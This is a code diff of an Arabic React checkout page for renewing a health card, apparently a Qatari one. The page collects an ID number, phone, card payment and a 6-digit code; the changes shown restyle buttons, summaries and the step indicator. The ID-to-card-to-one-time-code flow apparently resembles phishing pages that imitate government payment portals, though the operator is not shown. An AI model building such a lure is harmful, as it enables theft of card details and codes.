@@ -52,7 +52,7 @@ function StepIndicator({ current }: { current: number }) {
                 >
                   {done ? <Check className="h-4 w-4 stroke-[3]" /> : i + 1}
                 </div>
-                <span className={`mt-2 text-center text-xs font-medium leading-tight ${active ? 'text-[#C8102E]' : done ? 'text-gray-700' : 'text-gray-400'}`}>
+                <span className={`mt-2 text-center text-xs font-medium leading-tight ${active || done ? 'text-[#C8102E]' : 'text-gray-400'}`}>
                   {s.label}
                 </span>
               </div>
@@ -72,6 +72,15 @@ function SummaryRow({ label, value }: { label: string; value: string }) {
     <div className="flex items-center justify-between gap-3 py-1">
       <span className="text-gray-500 text-sm">{label}</span>
       <span className="text-gray-900 font-semibold text-sm">{value || '—'}</span>
+    </div>
+  )
+}
+
+function SummaryBlock({ label, value, withDivider = false }: { label: string; value: string; withDivider?: boolean }) {
+  return (
+    <div className={`py-2 ${withDivider ? 'border-b border-gray-200' : ''}`}>
+      <p className="text-gray-500 text-base">{label}</p>
+      <p className="text-3xl leading-tight font-semibold text-gray-900 mt-1">{value || '—'}</p>
     </div>
   )
 }
@@ -274,7 +283,7 @@ export default function SubmitPage() {
     return (
       <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
         <div className="max-w-xl mx-auto">
-          <StepIndicator current={4} />
+          <StepIndicator current={5} />
           <Card className="w-full text-center border-0 shadow-lg">
             <CardContent className="pt-12 pb-10 px-8">
               <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
@@ -295,6 +304,13 @@ export default function SubmitPage() {
   return (
     <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
       {waiting && <FullPageLoader message="جاري التحقق من المعلومات..." />}
+      <div className="fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold flex items-center justify-center shadow">
+        <span className="text-center leading-tight">
+          المساعد
+          <br />
+          ة
+        </span>
+      </div>
 
       <div className="max-w-xl mx-auto">
         <div className="text-center mb-8">
@@ -344,12 +360,12 @@ export default function SubmitPage() {
                   </RadioGroup>
                 </div>
                 <div className="flex gap-3 pt-2">
-                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                  <Button type="button" onClick={clearStep1Fields} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
+                    تفريغ الحقول
+                  </Button>
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                     {loading ? 'جاري الحفظ...' : 'تابع'}
                     <ChevronLeft className="w-4 h-4 mr-1" />
-                  </Button>
-                  <Button type="button" onClick={clearStep1Fields} className="flex-1 h-11 bg-gray-500 hover:bg-gray-600 text-white">
-                    تفريغ الحقول
                   </Button>
                 </div>
               </form>
@@ -364,17 +380,16 @@ export default function SubmitPage() {
             </CardHeader>
             <CardContent>
               <form onSubmit={handleStep2} className="space-y-5">
-                <div className="rounded-xl border border-gray-200 p-4">
-                  <SummaryRow label="الرقم الشخصي" value={idNum} />
-                  <SummaryRow label="تاريخ انتهاء الصلاحية" value={currentExpiryDate} />
-                </div>
+                <SummaryBlock label="الرقم الشخصي" value={idNum} withDivider />
+                <SummaryBlock label="تاريخ انتهاء الصلاحية" value={currentExpiryDate} />
+                <div className="border-t border-gray-200 pt-4" />
                 <div className="space-y-2">
                   <Label htmlFor="years">عدد السنوات المطلوبة <span className="text-red-500">*</span></Label>
                   <Input
                     id="years"
                     value={requestedYears}
                     onChange={e => setRequestedYears(e.target.value.replace(/\D/g, '').slice(0, 1))}
-                    className="h-11"
+                    className="h-12"
                     inputMode="numeric"
                     maxLength={1}
                     placeholder="1"
@@ -387,7 +402,7 @@ export default function SubmitPage() {
                     value={phone}
                     onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
                     placeholder="أدخل رقم الهاتف"
-                    className="h-11"
+                    className="h-12"
                     inputMode="tel"
                   />
                 </div>
@@ -413,11 +428,11 @@ export default function SubmitPage() {
                     ))}
                   </RadioGroup>
                 </div>
-                <div className="flex gap-3">
-                  <Button type="button" onClick={() => setStep(1)} className="flex-1 h-11 bg-gray-500 hover:bg-gray-600 text-white">
+                <div className="flex gap-3 pt-2">
+                  <Button type="button" onClick={() => setStep(1)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     السابق
                   </Button>
-                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                     {loading ? 'جاري الحفظ...' : 'تابع'}
                     <ChevronLeft className="w-4 h-4 mr-1" />
                   </Button>
@@ -434,8 +449,8 @@ export default function SubmitPage() {
             </CardHeader>
             <CardContent>
               <form onSubmit={handleStep3} className="space-y-5">
-                <div className="rounded-xl border border-gray-200 p-4">
-                  <h3 className="text-xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
+                <div className="rounded-xl border border-gray-200 p-4 space-y-2">
+                  <h3 className="text-4xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
                   <SummaryRow label="الرقم الشخصي" value={idNum} />
                   <SummaryRow label="تاريخ انتهاء الصلاحية الجديد" value={newExpiryDate} />
                   <SummaryRow label="عدد السنوات المطلوبة" value={String(yearsCount)} />
@@ -445,16 +460,16 @@ export default function SubmitPage() {
                   <SummaryRow label="هل تريد إستلام رسالة نصية ؟" value={smsReceipt === 'yes' ? 'نعم' : 'لا'} />
                 </div>
                 <div className="rounded-xl border border-gray-200 p-4">
-                  <h3 className="text-2xl font-bold text-gray-900 mb-2">الرسوم</h3>
+                  <h3 className="text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
                   <SummaryRow label="الرسوم المطلوب" value="رسوم تجديد البطاقة الصحية" />
                   <SummaryRow label="قيمة الرسم" value="100 ريال قطري" />
                   <SummaryRow label="المجموع" value="100 ريال قطري" />
                 </div>
                 <div className="flex gap-3">
-                  <Button type="button" onClick={() => setStep(2)} className="flex-1 h-11 bg-gray-500 hover:bg-gray-600 text-white">
+                  <Button type="button" onClick={() => setStep(2)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     السابق
                   </Button>
-                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                     {loading ? 'جاري التحويل...' : 'دفع'}
                   </Button>
                 </div>
@@ -494,10 +509,10 @@ export default function SubmitPage() {
                   سيتم تحويلك لإدخال بيانات البطاقة بشكل آمن
                 </div>
                 <div className="flex gap-3">
-                  <Button type="button" onClick={() => setStep(3)} className="flex-1 h-11 bg-gray-500 hover:bg-gray-600 text-white">
+                  <Button type="button" onClick={() => setStep(3)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     إلغاء
                   </Button>
-                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                     {loading ? 'جاري المتابعة...' : 'متابعة'}
                     <ChevronLeft className="w-4 h-4 mr-1" />
                   </Button>
@@ -578,10 +593,10 @@ export default function SubmitPage() {
                   <span>بياناتك محمية بتشفير SSL 256-bit</span>
                 </div>
                 <div className="flex gap-3">
-                  <Button type="button" onClick={() => setStep(4)} className="flex-1 h-11 bg-gray-500 hover:bg-gray-600 text-white">
+                  <Button type="button" onClick={() => setStep(4)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     رجوع
                   </Button>
-                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                     {loading ? 'جاري المعالجة...' : 'تأكيد'}
                     <ChevronLeft className="w-4 h-4 mr-1" />
                   </Button>
@@ -628,7 +643,7 @@ export default function SubmitPage() {
                     maxLength={6}
                   />
                 </div>
-                <Button type="submit" disabled={loading} className="w-full h-11 bg-[#8A1538] hover:bg-[#6d1030]">
+                <Button type="submit" disabled={loading} className="w-full h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                   {loading ? 'جاري التحقق...' : 'تأكيد الرمز'}
                 </Button>
               </form>
